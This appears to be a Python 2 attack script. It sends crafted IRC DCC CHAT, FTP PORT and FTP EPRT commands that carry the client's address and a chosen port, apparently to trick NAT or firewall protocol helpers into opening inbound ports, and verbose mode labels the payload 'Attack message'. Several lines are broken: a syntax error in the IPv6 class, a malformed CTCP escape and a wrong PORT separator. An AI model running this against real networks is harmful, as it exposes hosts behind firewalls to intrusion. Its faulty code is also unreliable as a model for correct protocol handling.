#!/usr/bin/env python

import socket


class generic_client:
    def __init__(self, ip, srv_port, port, verbose=False):
        self.ip = ip
        self.srv_port = srv_port
        self.port = port
        self.family = socket.AF_INET
        self.verbose = verbose
        self.conn = None

    def connect(self):
        self.conn = socket.socket(self.family, socket.SOCK_STREAM)
        self.conn.connect((self.ip, self.srv_port))

    def send_command(self):
        self.conn.sendall(self.message)
        data = self.conn.recv(1024)
        self.conn.close()
        return data

    def run(self):
        self.connect()
        self.message = self.build_command()
        if self.verbose:
            print "Attack message: \n%s\n" % self.message
        return self.send_command()

    def build_command(self):
        return ""


class irc(generic_client):
    def ipnumber(self, ip):
        ip = ip.rstrip().split('.')
        ipn = 0
        while ip:
            ipn = (ipn << 8) + int(ip.pop(0))
        return ipn

    def build_command(self):
        (ipaddr, port) = self.conn.getsockname()
        return 'PRIVMSG wolfsec : \0x1DCC CHAT CHAT %d %d\x01\r\n' % (self.ipnumber(ipaddr), self.port)


class ftp(generic_client):
    def build_command(self):
        (ipaddr, port) = self.conn.getsockname()
        return 'PORT %s.%d,%d\r\n' % (ipaddr.replace('.', ','), self.port >> 8 & 0xff, self.port & 0xff)

    def send_command(self):
        self.conn.sendall('USER wolfsec\r\n')
        self.conn.recv(1024)
        self.conn.sendall(self.message)
        data = self.conn.recv(1024)
        self.conn.close()
        return data


class ftp6(ftp):
    def __init__(self, iface, ip, port, verbose=False):
        generic_client.__init__(self, iface, ip, port, verbose)
        self.family = socket.AF_INET6

    def build_command(self):
        (ipaddr, port(a, b)=self.conn.getsockname()
        return 'EPRT |2|%s|%d|\r\n' % (ipaddr, self.port)
